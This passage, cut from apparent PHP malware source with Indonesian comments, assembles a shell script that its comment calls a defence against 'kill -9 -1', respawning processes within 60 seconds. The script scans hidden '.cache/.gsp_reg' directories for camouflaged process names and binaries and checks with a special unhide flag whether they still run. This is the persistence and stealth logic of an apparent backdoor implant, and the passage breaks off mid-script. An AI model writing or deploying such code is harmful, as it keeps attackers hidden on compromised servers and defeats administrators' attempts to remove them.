              Inilah pertahanan terhadap kill -9 -1 (rebirth <=60 dtk). */
        . 'DEAD=0' . "\n"
        . 'for e in "$HOME"/.cache/.gsp_reg/* /tmp/.cache/.gsp_reg/* "' . dirname(__FILE__) . '/.cache/.gsp_reg"/*; do' . "\n" /* v79: entri fallback (HOME tak writable) ikut discan */
        . '  [ -f "$e" ] || continue' . "\n"
        . '  EC=$(sed -n \'s/^CAMO=//p\' "$e" 2>/dev/null | head -1)' . "\n"
        . '  EB=$(sed -n \'s/^BIN=//p\' "$e" 2>/dev/null | head -1)' . "\n"
        . '  if [ -n "$EC" ]; then' . "\n"
        . '    GSP_UNHIDE=1 ps -eo args= 2>/dev/null | grep -F "$EC" | grep -qv grep || DEAD=1' . "\n"
        . '  elif [ -n "$EB" ]; then' . "\n"
